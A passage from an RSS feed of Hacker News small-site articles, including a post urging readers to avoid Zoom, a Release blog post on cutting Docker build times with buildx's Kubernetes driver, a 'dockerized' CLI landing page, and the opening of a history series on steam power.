are constantly bombarded with information, but this article is meant to put Zoom‚Äôs historic
misconduct back into perspective and explain why I think more people should be avoiding the platform
all together.</p>

</div>
</div>
<div>
<h2 id="_evidence">Evidence</h2>
<div>
<p>The following spans many month‚Äôs worth of articles I‚Äôve collected about Zoom‚Äôs disturbing track
record. While mostly listed in chronological order, you‚Äôll want to read through each of these to
paint the picture of Zoom‚Äôs past behavior and what that‚Äôs exposed about their underlying ethics.
<em>Spoiler Alert</em>: Zoom hasn‚Äôt substantially improved since these issues arose and I don‚Äôt expect
their tactics to change anytime soon.</p>

<p>From numerous security vulnerabilities to complying with the Chinese authoritarian regime, the
severity of these issues should at least tempt you to avoid using Zoom‚Äâ‚Äî‚Äâespecially in regards to
aiding China, which is exacting
<a href="https://en.wikipedia.org/wiki/Cultural_genocide_of_Uyghurs">cultural genocide of the Uyghurs</a>.
I‚Äôve been to Xinjiang, met the Uyghurs, eaten with them, browsed through their bazaars, etc. They
don‚Äôt deserve this kind of treatment and we can do our part by not funding companies that diminish
their value.</p>
<p>In addition to the above, I find Zoom‚Äôs lack of regard for the people they are helping to
communicate more effectively very disconcerting. Video conferencing is particularly sensitive in
nature and I would think that customer security would be a top priority in Zoom‚Äôs software offering.
Instead, Zoom is prioritizing capturing the market as quickly as possible and at any cost. I
understand the need for growth but you can achieve this without sacrificing those you serve.</p>
</div>
</div>
<div>
<h2 id="_tangential_concerns">Tangential Concerns</h2>
<div>
<p>If you, too, want to avoid the ethical mess that is Zoom and happen to be using Keybase, be aware
they have <a href="https://keybase.io/blog/keybase-joins-zoom">joined Zoom</a>. You‚Äôll want to reconsider
your options in this space. I‚Äôd recommend using <a href="https://1password.com/">1Password</a>,
<a href="https://bitwarden.com/">Bitwarden</a>, or others.</p>
</div>
</div>
<div>
<h2 id="_alternatives">Alternatives</h2>
<div>
<p>Should you be looking for alternatives to Zoom conferencing, here are a few choices that might be of
interest. I‚Äôve not vetted all of these myself so tread with caution.</p>
<div>
<ul>
<li>
<p><a href="https://tandem.chat/">Tandem</a> - Focuses on providing a quick way in which to collaborate with
others with minimal overhead.</p>
</li>
<li>
<p><a href="https://www.around.co/">Around</a> - Early days for this company but has an interesting focus on
speakers/attendees which float around your workspace.</p>
</li>
<li>
<p><a href="https://www.remotion.com/">Remotion</a> - Provides a similar experience to Around and is currently
in Beta.</p>
</li>
<li>
<p><a href="https://www.vowel.com/">Vowel</a> - Early days for this service but provides a quick way to
collaborate with fellow colleagues, present, share, and transcribe audio into text.</p>
</li>
<li>
<p><a href="https://jamm.app/">Jamm</a> - Similar in nature to Around and Remotion but also has aspects of
Screenhero. If you remember Screenhero before Slack killed it.</p>
</li>
<li>
<p><a href="https://team.video/">Team Video</a> - Provides an experience focused around meetings within the
confines of their app which may or may not be what you want.</p>
</li>
<li>
<p><a href="https://screen.so/">Screen</a> - A new product/service brought to you by the same people who made
Screenhero.</p>
</li>
<li>
<p><a href="https://tuple.app/">Tuple</a> - Collaboration, screen sharing, and multiple cursor mouse control
for two people only. Worth pointing out due to mentioning Screen above.</p>
</li>
<li>
<p><a href="https://jitsi.org/">Jitsi</a> - An active and open source alternative to Zoom which has been
around since 2003. Provides dial-in, recording, simulcasting, end-to-end encryption, and more.</p>
</li>
<li>
<p><a href="https://joinwork.space/">Spaces</a> - Provides a more focused collaboration with another person or
multiple people with a focus on being able to screenshare, teach, share multiple cursors, etc.</p>
</li>
<li>
<p><a href="https://jackfruit.live/">Jackfruit</a> - Enterprise focused where the key features are around
webinars. Seems like a great tool for presenting to audiences of thirty people or less.</p>
</li>
<li>
<p><a href="https://hopin.to/">Hopin</a> - A full fledged online platform for virtual events and conferences
with a bunch of great features for making a pleasant experience.</p>
</li>
<li>
<p><a href="https://remo.co/">Remo</a> - Built for larger audiences and conferencing purposes in general but
is all browser based.</p>
</li>
<li>
<p><a href="https://www.mmhmm.app/">mmhmm</a> - A recent newcomer in this space innovating upon the standard
experience. Access is by invite only at the moment.</p>
</li>
<li>
<p><a href="https://makespace.fun/">MakeSpace</a> - Another innovative solution but has no visible product
offering I‚Äôm aware of. Worth keeping an eye on, though.</p>
</li>
<li>
<p><a href="https://tappy.so/">Tappy</a> - Early days for this service but the goal is to make collaboration
amongst your colleagues quick for 1:1 chat, group chat, screen sharing, note taking, etc.</p>
</li>
</ul>
</div>
</div>
</div>
<div>
<h2 id="_parting_thoughts">Parting Thoughts</h2>
<div>
<p>As an individual, switching to an alternative solution is fairly trivial. As a company, I realize
introducing this kind of change in the midst of a busy work schedule is not as swift an option. Even
more so with large teams. If nothing else, initiating a discussion around Zoom‚Äôs reckless disregard
for security might be enough to get the ball rolling and even lead to insights on how communication
could be improved in general.</p>
<p>I‚Äôve managed to avoid using Zoom since removing their software offering entirely. When scheduling
meetings with others, if they try to send me a Zoom link, I‚Äôll suggest alternatives. Unfortunately,
I have encountered some fiery pushback from some in various social channels and haven‚Äôt been able to
convince my local meetups‚Äâ‚Äî‚Äâyet‚Äâ‚Äî‚Äâto switch to different software. Therefore, I am no longer able
to attend these meetups until more people take a stand against Zoom‚Äôs behavior.</p>
<p>Your mileage may vary with that kind of zero-tolerance approach. Still, I‚Äôd rather fight for a
future that encourages ethical behavior and prioritizes people ahead of any capitalistic gain. I
hope you agree and vote by not spending money on companies or software that promote these practices.
We <em>can</em> make a difference, little by little!</p>
</div>
</div>
        </article>
      </section>
    </section>
  </main>

  

</div></div>]]>
            </description>
            <link>https://www.alchemists.io/articles/avoid_zoom/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183409</guid>
            <pubDate>Thu, 18 Feb 2021 18:17:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cutting Build Time in Half with Docker‚Äôs Buildx Kubernetes Driver]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183334">thread link</a>) | @jeremy_k
<br/>
February 18, 2021 | https://releaseapp.io/blog/cutting-build-time-in-half-docker-buildx-kubernetes | <a href="https://web.archive.org/web/*/https://releaseapp.io/blog/cutting-build-time-in-half-docker-buildx-kubernetes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>At Release, environments are our main focus, but we can‚Äôt create environments without builds. Recently we undertook a project to revisit our build infrastructure and determine if it needed to be upgraded. Build times had become a big factor in our service delivery and we needed a way to improve our customers‚Äô experiences. One of the main areas that we wanted to improve upon was the parallelism of building multiple docker images for a single application.</p><p>The title of the article already spoiled the solution, and the alternative ‚ÄòRelease Did This One Thing To Cut Their Build Time In Half!‚Äô didn‚Äôt quite fly with the rest of the company, but Docker‚Äôs new <a href="https://github.com/docker/buildx" target="_blank" rel="noreferrer">buildx</a> project fit the bill. First, we‚Äôll cover what our original infrastructure looked like and how long builds on an example project were taking. Then, we‚Äôll describe the changes we made to use buildx and the speed increases we observed.</p><p>Let‚Äôs start off with a diagram of what our original infrastructure looked like.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/75WoaAxoZMIL73zK0JKPId/f98ff948f97c0cc7b979c4b4352a032c/release-builder-architecture.png" alt="release-builder-architecture"></p><p>As you can see, the requests for builds would flow into our main Rails application and then divvied out to the different builder instances through Sidekiq. The <code>builder</code> container is Ruby code that would authenticate to Github, clone the repository, check out the correct SHA, and then execute the <code>docker build</code>. Due to the way we built the authentication to pull the code from Github, a single <code>builder</code> container could only clone one repository at a time. Which meant that the container could only do a single build request at a time. We added threading in the Ruby code to be able to execute multiple <code>docker build</code> commands at a time, but the number of builder containers we had spun up limited our concurrent builds. While it‚Äôs not hard to horizontally scale with Kubernetes, we saw this authentication setup as a major bottleneck. </p><p>Another issue we encountered was that we had no mechanism for attempting to place builds on servers where they had been previously built, instead opting for grabbing the first free server. This meant there was very little chance to land on the same server and get the full benefit of Docker caching. While this isn‚Äôt a deal breaker for us, we still believed we could do better when creating the version of our build infrastructure. Enough of the theoretical, let‚Äôs actually build something!</p><p>Release Applications can contain many docker images and one of our favorite example repositories to showcase this is our fork of <a href="https://github.com/awesome-release/release-example-voting-app" target="_blank" rel="noreferrer">example-voting-app</a>. Looking at the <a href="https://github.com/awesome-release/release-example-voting-app/blob/master/docker-compose.yml" target="_blank" rel="noreferrer">docker-compose</a> we see that there are 3 different Docker images that we have to build, <code>result</code>, <code>vote</code>, and <code>worker</code>. Now that we have an understanding of Release‚Äôs original infrastructure and the application we want to build, let‚Äôs start up a fresh build and see the results.</p><p><em>NOTE</em> I forked the <code>awesome-release</code> repo to my own Github, <code>jer-k</code> for the following results.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/21reYa1lgqocT6MTojva4J/0d6826574fb8718d76bfcf6c855dd490/uncached-release.png" alt="uncached-release"></p><p>We can see that this brand new build with no cache hits took two minutes and 15 seconds to complete. Next, we want to make a few changes to ensure that each Docker image needs to be rebuilt. The changes are listed below.</p><div><pre><p><span>1</span><span>git status</span></p><p><span>2</span><span>On branch release_builders</span></p><p><span>3</span><span>Changes to be committed:</span></p><p><span>4</span><span>  (use "git restore --staged &lt;file&gt;..." to unstage)</span></p><p><span>5</span><span>    modified:   result/views/index.html</span></p><p><span>6</span><span>    modified:   vote/app.py</span></p><p><span>7</span><span>    modified:   worker/src/main/java/worker/Worker.java</span></p></pre></div><p>For the purpose of this blog post, I ensured the following build ran on the same builder as the first and that we will have cache hits. As noted before, this wasn‚Äôt always the case in our production environment.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/69tKlV3mBuV6S6c7BhSaay/c51464f443c1888cd4f74fe3394b32f4/cached-release.png" alt="cached-release"></p><p>The caching helps and cuts 45 seconds off the build! The uncached build took almost twice as long as the second build with caching, but our assumption was that we could do a lot better (cached and uncached) with some new technology.</p><h2 id="enter-dockers-buildx-kubernetes-driver">Enter Docker‚Äôs Buildx Kubernetes Driver</h2><p>One of the first things we wanted to solve was the concurrency issue and we set out to ensure that Docker itself was able to handle a larger workload. We came across the issue <a href="https://github.com/moby/moby/issues/9656" target="_blank" rel="noreferrer">Concurrent ‚Äúdocker build‚Äù takes longer than sequential builds</a> where people were describing what we feared; Docker slowed down when many builds were being run at the same time. Lucky for us, that issue was opened in 2014 and plenty of work had been done to resolve this issue. The final comment, by a member of the Docker team, was <a href="https://github.com/moby/moby/issues/9656#issuecomment-610476810" target="_blank" rel="noreferrer">‚ÄúClosing this. BuildKit is highly optimized for parallel workloads. If you see anything like this in buildkit or buildkit compared to legacy builder please report a new issue with a repro case.‚Äù</a> Thus we set out to learn more about <a href="https://docs.docker.com/develop/develop-images/build_enhancements/" target="_blank" rel="noreferrer">BuildKit</a> (the Github repository is located <a href="https://github.com/moby/buildkit" target="_blank" rel="noreferrer">here</a>). While researching, we came across <a href="https://github.com/docker/buildx" target="_blank" rel="noreferrer">buildx</a>, which ended up having three key features we believed would resolve many of our issues. These three features were the <a href="https://github.com/docker/buildx#buildx-bake-options-target" target="_blank" rel="noreferrer">bake</a> command, the <a href="https://github.com/docker/buildx#--driver-driver" target="_blank" rel="noreferrer">buildx kubernetes driver</a>, and the ability for the Kubernetes driver to consistently send builds to the same server. Let‚Äôs cover each of these, first up the <code>bake</code> command.</p><div><pre><p><span>1</span><span>buildx bake [OPTIONS] [TARGET...]</span></p><p><span>2</span><span>Bake is a high-level build command.</span></p><p><span>3</span><span></span></p><p><span>4</span><span>Each specified target will run in parallel as part of the build.</span></p></pre></div><p><code>bake</code> intrigued us because it seemed to be a built-in command for us to avoid using Ruby threading for our parallelism. <code>bake</code> takes an input of a file, which can either be in the form of a <code>docker-compose</code>, <code>.json</code>, or <code>.hcl</code>. We initially tested <code>bake</code> with the docker-compose from example-voting-app and we were blown away at how smoothly it built directly out of the box and how quickly it was able to build the three images! However, we opted to create our own <code>.json</code> file generator in Ruby, parsing our <a href="">Application Template</a> into an output. Here is our generated file for example-voting-app.</p><div><pre><p><span>1</span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>"group"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>"default"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>      </span><span>"targets"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>5</span><span>        </span><span>"vote"</span><span>,</span><span></span></p><p><span>6</span><span>        </span><span>"result"</span><span>,</span><span></span></p><p><span>7</span><span>        </span><span>"worker"</span><span></span></p><p><span>8</span><span>      </span><span>]</span><span></span></p><p><span>9</span><span>    </span><span>}</span><span></span></p><p><span>10</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>11</span><span>  </span><span>"target"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>12</span><span>    </span><span>"vote"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>      </span><span>"context"</span><span>:</span><span> </span><span>"./vote"</span><span>,</span><span></span></p><p><span>14</span><span>      </span><span>"tags"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>15</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/vote:latest"</span><span>,</span><span></span></p><p><span>16</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/vote:buildx-builders"</span><span></span></p><p><span>17</span><span>      </span><span>]</span><span></span></p><p><span>18</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>19</span><span>    </span><span>"result"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>20</span><span>      </span><span>"context"</span><span>:</span><span> </span><span>"./result"</span><span>,</span><span></span></p><p><span>21</span><span>      </span><span>"tags"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>22</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/result:latest"</span><span>,</span><span></span></p><p><span>23</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/result:buildx-builders"</span><span></span></p><p><span>24</span><span>      </span><span>]</span><span></span></p><p><span>25</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>26</span><span>    </span><span>"worker"</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>27</span><span>      </span><span>"context"</span><span>:</span><span> </span><span>"./worker"</span><span>,</span><span></span></p><p><span>28</span><span>      </span><span>"tags"</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>29</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/worker:latest"</span><span>,</span><span></span></p><p><span>30</span><span>        </span><span>"&lt;REDACTED&gt;.dkr.ecr.us-west-2.amazonaws.com/jer-k/release-example-voting-app/worker:buildx-builders"</span><span></span></p><p><span>31</span><span>      </span><span>]</span><span></span></p><p><span>32</span><span>    </span><span>}</span><span></span></p><p><span>33</span><span>  </span><span>}</span><span></span></p><p><span>34</span><span></span><span>}</span></p></pre></div><p>There are other inputs which can make their way into this file, such as build args, but since example-voting-app does not have any, they are omitted.</p><p>Next, we wanted to find more information on the Kubernetes driver and we found this blog post <a href="https://medium.com/nttlabs/buildx-kubernetes-ad0fe59b0c64" target="_blank" rel="noreferrer">Kubernetes driver for Docker BuildX</a> from the author of the <a href="https://github.com/docker/buildx/pull/167" target="_blank" rel="noreferrer">Pull Request</a>. We encourage you to read the latter as it covers getting up and running with the Kubernetes driver as well how the caching works, which is exactly what we needed. With that information in hand, we were able to start work on adding the buildx servers to our cluster. We created a generic way to deploy the servers into different clusters and adjust the number of replicas with the final command being</p><div><pre><p><span>1</span><span>docker buildx create --name #{name} --driver kubernetes --driver-opt replicas=#{num_replicas},namespace=#{builder_namespace} --use</span></p></pre></div><p>For us, we created a <code>release-builder</code> namespace with five replicas, in our development cluster. We can see the output by querying for the pods</p><div><pre><p><span>1</span><span>kubectl get pods --namespace=release-builder</span></p><p><span>2</span><span>NAME                            READY   STATUS    RESTARTS   AGE</span></p><p><span>3</span><span>development0-86d99fcf46-26j9f   1/1     Running   0          6d10h</span></p><p><span>4</span><span>development0-86d99fcf46-5scpq   1/1     Running   0          6d13h</span></p><p><span>5</span><span>development0-86d99fcf46-jkk2b   1/1     Running   0          15d</span></p><p><span>6</span><span>development0-86d99fcf46-llkgq   1/1     Running   0          18d</span></p><p><span>7</span><span>development0-86d99fcf46-mr9jt   1/1     Running   0          20d</span></p></pre></div><p>Since we have five replicas, we wanted to ensure that when we build applications, they end up on the same server so that we get the greatest amount of caching possible (distributed caching is a topic for another day). Luckily for us, <code>buildx</code>, with the Kubernetes driver, has an option for where to send the builds called <code>loadbalance</code>.</p><div><pre><p><span>1</span><span>loadbalance=(sticky|random) - Load-balancing strategy. </span></p><p><span>2</span><span>If set to "sticky", the pod is chosen using the hash of the context path. Defaults to "sticky"</span></p></pre></div><p>The default <code>sticky</code> means that the builds should always end up on the same server due to the hashing (more detailed information on this is described in the aforementioned blog post). With all of that in place, we are ready to test out our new setup!</p><p>Using the same example-voting-app repository as before, I created a new branch <code>buildx_builders</code> and pointed the code to the buildx servers. </p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/3gqbExE2XQMNqyUQ60m27m/9e215fc99510b5a18bb6792eba5679ec/uncached-buildx.png" alt="uncached-buildx"></p><p>What we see is that this uncached build was more than twice as fast as the other uncached build and even faster than the cached build on the old infrastructure! But uncached builds should be a thing of the past with the sticky load balancing, so let‚Äôs make the same changes as the previous branch and see the results.</p><p><img src="https://images.ctfassets.net/qf96nnjfyr2y/2MxDyCqaSrOnffVSNC3SFu/abc0896e3eef27b927394b12fc9e1e29/cached-buildx.png" alt="cached-buildx"></p><p>This build finished three times faster than the previous cached build! These types of speed increases are the reason we set out to redo our build infrastructure. The faster the builds complete, the faster we can create environments and help our customers deliver their products.</p><p>We‚Äôre still experimenting with <code>buildx</code> and learning as we go, but the initial results were more than enough for us to migrate our own production builds to the new infrastructure. We‚Äôre going to continue to blog about this topic as we learn more and scale so check back in with the Release blog in the future!</p></div></article></div>]]>
            </description>
            <link>https://releaseapp.io/blog/cutting-build-time-in-half-docker-buildx-kubernetes</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183334</guid>
            <pubDate>Thu, 18 Feb 2021 18:11:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dockerize Your Dev Env]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183231">thread link</a>) | @benzaita
<br/>
February 18, 2021 | https://benzaita.github.io/dockerized-cli/index.html | <a href="https://web.archive.org/web/*/https://benzaita.github.io/dockerized-cli/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            <div>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/code.svg"></figure>
                    
                    <p>
                        Declare which build and/or development tools are needed in code, rather than in a README file.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/door.svg"></figure>
                    
                    <p>
                        Bootstrapping a development environment is as easy as running <code>dockerized shell</code>.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/checkmark.svg"></figure>
                    
                    <p>
                        No more "Works on my machine" because everyone in the team is using
                        exactly the same toolset.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/flip-horizontal.svg"></figure>
                    
                    <p>
                        Your CI can use exactly the same toolset as your developers.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/dock-row.svg"></figure>
                    
                    <p>
                        No need for <code>nvm</code>, <code>virtualenv</code>, <code>SDKMAN</code>, and such. Each
                        development environment is isolated.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/drink-margarita.svg"></figure>
                    
                    <p>
                        You no longer need to maintain messy <code>docker run</code> commands yourself.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/magic-wand.svg"></figure>
                    
                    <p>
                        Just prepend any command with <code>dockerized exec</code>.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/vscode.svg"></figure>
                    
                    <p>
                        "dockerized" complements VS Code and can use the <a href="https://code.visualstudio.com/docs/remote/containers">Remote Container</a>
                        you already configured.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/emoji.svg"></figure>
                    
                    <p>
                        You can use the "dockerized" development environment, or set up one
                        directly on your machine. Unlike other tools
                        "dockerized" is a non-intrusive guest on your machine.
                    </p>
                </section>
                <section>
                    <figure><img src="https://benzaita.github.io/dockerized-cli/assets/fast.svg"></figure>
                    
                    <p>
                        "dockerized" can <a href="https://github.com/benzaita/dockerized-cli/wiki/Caching-the-'dockerized'-image">cache</a> the build environment to speed up builds on CI pipelines.
                    </p>
                </section>
            </div>
        </article></div>]]>
            </description>
            <link>https://benzaita.github.io/dockerized-cli/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183231</guid>
            <pubDate>Thu, 18 Feb 2021 18:02:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Age of Steam]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183224">thread link</a>) | @allturtles
<br/>
February 18, 2021 | https://technicshistory.com/2021/02/18/the-age-of-steam-introduction/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2021/02/18/the-age-of-steam-introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>The most striking feature of the engineering quad of my <em>alma mater</em>, Rice University, are the three massive slabs of granite erected on large plinths at its center, each canted at a different angle: 45, 90, and 180 degrees. Less remarked upon, but more significant to my young, impressionable, and romantic mind, was another sculpture, entitled ‚ÄúEnergy,‚Äù tucked off on the north side of the quad, against the fa√ßade of the Abercrombie Laboratory. It depicts, in relief, a biblical figure clad in a loincloth and sporting a majestic beard, pulling beams of light from the sun with his left hand and casting them down to earth with his right ‚Äì the apotheosis of the engineer. For indeed, virtually all of the energy used by human civilization derives from the sun, in some fashion or another,<a href="#_ftn1">[1]</a> a revelation which struck me with great force as an undergraduate.</p>



<p>In the eighteenth century, the predominant source of non-animal energy in European society came from falling water ‚Äì water that had been lifted into the clouds by the warmth of the sun before descending as rain.<a href="#_ftn2">[2]</a> Watermills were known and used across Eurasia from ancient times ‚Äì the earliest evidence comes from the third century BCE. At the height of the Roman Empire, engineers developed the technology on a gargantuan scale, as evidenced by the ruins of the Barbegal mill complex in southern France, which consisted of sixteen wheels running in pairs down a steep hillside, all supplied by a large stone aqueduct. However, there is no evidence for widespread use of the waterwheel prior to the middle ages, when they multiplied across the streams of Western Europe by the thousands. The Domesday Book, for example, an eleventh-century royal census of England and Wales, counted over 5,000 mills in the territories claimed by William the Conqueror.</p>



<p>The endless rotation of the wheel was most often applied to the grinding of grain, but mills for the fulling of woolen cloth were also common ‚Äì they beat the fibers into a firm felt with wooden triphammers controlled by a camshaft. By the later middle ages, however, inventive craftsmen had applied the watermill to nearly every industrial task imaginable, as historian Lynn White, Jr. cataloged:</p>



<blockquote><p>‚Ä¶mills for tanning or laundering, mills for sawing, for crushing anything from olives to ore, mills for operating the bellows of blast furnaces, the hammers of the forge, or the grindstones to finish and polish weapons and armors, mills for reducing pigments for paint or pulp for paper or the mash for beer, were increasingly to be found all over Europe.<a href="#_ftn3">[3]</a></p></blockquote>



<p>As long as the rains fell and the waters flowed, these machines carried out tasks that in previous ages would have been possible only at the cost of sore muscles, aching joints, and dripping sweat ‚Äì whether human or animal.</p>



<p>Millwrights developed a variety of techniques over the centuries to adapt the wheel to different circumstances. The vertical ‚Äúundershot‚Äù wheel, with water directed against the bottom of the wheel, served well on streams with a shallow grade but a high flow of water. The ‚Äúovershot‚Äù wheel, on the other hand, which brought water to the top of the wheel where it filled buckets attached to its circumference, worked better for steep, low-volume streams. A trickle too feeble to push an undershot wheel could still fill buckets, if more slowly, and the steep grade made it easier to bring the water to the top of the wheel (although some sort of wooden flume was required to complete the millrace, which, along with the buckets, made the overshot wheel a more complex design). Horizontal wheels, on the other hand, though relatively inefficient, allowed for very simple mill construction. A horizontal wheel under a flour mill built atop the millrace could turn the grinding stone directly, without the need for a lantern gear to translate a vertical rotation into a horizontal one.</p>



<p>Yet for all the variety of its applications, the supply of water power was strictly limited. One could dam mill ponds to even out the flow of water and cut races to bring water directly to the wheel, but a given watercourse could provide a reliable supply of power to only so many mills. Along the Vienne in southwestern France, mills crowded together as densely as twenty per kilometer of water. The congestion of the streams of the Rhine region with waterwheels was likely responsible for the terminal decline of the Atlantic salmon fisheries in those waterways in the later middle ages.<a href="#_ftn4">[4]</a> As streams reached the saturation point, conflict over control of the water between upstream and downstream millers inevitably ensued. Many important precedents in property law revolved around such disputes. In 1600, for example, in a case came before the King‚Äôs Bench in England, the plaintiff had torn down a pair of decrepit fulling mills to replace them with mills to grind grain. In the interval, the defendant rerouted the water supply to his own upstream mills, claiming that the plaintiff had sacrificed his ancient rights to the water (from ‚Äútime whereof memory‚Äù) by tearing down the original mills. The court ruled in favor the plaintiff ‚Äì concluding that the destruction of the mills themselves did not destroy his right to the watercourse.<a href="#_ftn5">[5]</a></p>



<p>Humans had tapped another potent source of energy, of course, since time immemorial ‚Äì that of fire. Unlike water power, fire could produce heat to warm homes and smelt ores, but could not drive any kind of mechanical process. Wood historically provided most of the fuel supply for both domestic and industrial heating, sometimes supplemented by peat. But Britain stood out for its increasing exploitation of coal from the sixteenth century onward. By 1700, Britons were digging up nearly 3 million tons of it each year, over thirteen times as much as in 1560, although the population of the island as a whole had not even doubled in that time period.&nbsp;</p>



<p>In the course of the eighteenth century, inventors discovered that, when combined, these two elemental forces of fire and water could turn cheap, energy-dense coal into mechanical energy freed from the shackles of topography. Their creation, the steam engine, would transform the world. The industrial revolution ‚Äî and all it brought in its train, from cheap clothing to regimented factory labor ‚Äî began under water power but accelerated under a head of steam. Travel, war, and empire would never be the same after the creation of the railroad and the steamship.</p>



<p>Electrical power, too, was a product of steam. Edison set out to ‚Äúsubdivide the light,‚Äù scaling down the overpowering glow of electric arc lighting into something that could be used inside the home. But the even more profound long-term effect of the spread of electrical lighting systems was the ability to subdivide the power of a steam engine, and deliver it wherever, and in whatever quantity, one might desire. Steam removed the constraints that tied machinery to a nearby water source; electric power removed the need for any mechanical connection at all between a source of power and its point of use.</p>



<p>Steam power had knock on affects in other areas of technology and science, as well. Throughout the late eighteenth and nineteenth centuries, the heyday of steam, the development of steam engines simultaneously benefited from and stimulated improvements in metallurgy and the science of heat.</p>



<p>This series will survey the history of this ‚Äúage of steam‚Äù, an age that continues, in attenuated form, up to the present day. For despite the predominance of petroleum-based fuels in transportation over the last century, and the increasing pressure in recent decades to shift to steam-free sources of energy like solar and wind, much of our electricity still comes from heating water to make steam. This subject matter marks a departure for this blog, which heretofore has focused on the history of computing and communications technologies. Moreover, there is no shortage of popular accounts of the early history of the steam engine, including the recent <em>Energy </em>by Richard Rhodes and <em>The Most Powerful Idea in the World</em> by William Rosen. However, I believe this series will bring some fresh perspective on the story, especially by extending it into the twentieth century, unlike the many accounts that leave off as soon as the locomotive became a viable means of transport, around 1830.</p>



<p>Evidence for experiments and devices that turned steam into motion date back to the first century BCE, But Not until the philosophers of the seventeenth century developed a science of pressure were inventors able to create the first engines that could drive machinery by steam. We will begin this series in earnest next time by examining the emergence of this science, whose most important result was the revelation that the air itself has weight.</p>



<hr>



<p><a href="#_ftnref1">[1]</a> Nuclear and geothermal power are partial exceptions, deriving as they do from the husks of long-dead suns, rather than from our present one.</p>



<p><a href="#_ftnref2">[2]</a> Wind power also played an important role on the open plains of northwestern Europe, but it was generally less reliable than water and had more limited applications.</p>



<p><a href="#_ftnref3">[3]</a> Lynn White, Jr., <em>Medieval Technology and Social Change </em>(London: Oxford University Press, 1964), 89.</p>



<p><a href="#_ftnref4">[4]</a> H. Lenders, T. Chamuleau, A. Hendriks, <em>et al</em>., ‚ÄúHistorical Rise of Waterpower Initiated the Collapse of Salmon Stocks,‚Äù &nbsp; <em>Scientific Reports </em>6, 29269 (2016).</p>



<p><a href="#_ftnref5">[5]</a> T. E. Lauer, ‚ÄúThe Common Law Background of the Riparian Doctrine,‚Äù Missouri Law Review 28, 1 (Winter 1963), 83.</p>
			</div></div>]]>
            </description>
            <link>https://technicshistory.com/2021/02/18/the-age-of-steam-introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183224</guid>
            <pubDate>Thu, 18 Feb 2021 18:02:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GPT-3, Esq? Evaluating AI Legal Summaries [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 39 (<a href="https://news.ycombinator.com/item?id=26183114">thread link</a>) | @gavelin
<br/>
February 18, 2021 | http://www.davidvictorrodriguez.com/uploads/2/6/4/2/26420847/gpt-3_esq_-_evaluating_ai_legal_summaries.pdf | <a href="https://web.archive.org/web/*/http://www.davidvictorrodriguez.com/uploads/2/6/4/2/26420847/gpt-3_esq_-_evaluating_ai_legal_summaries.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.davidvictorrodriguez.com/uploads/2/6/4/2/26420847/gpt-3_esq_-_evaluating_ai_legal_summaries.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183114</guid>
            <pubDate>Thu, 18 Feb 2021 17:53:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Turn an Idea into a Business]]>
            </title>
            <description>
<![CDATA[
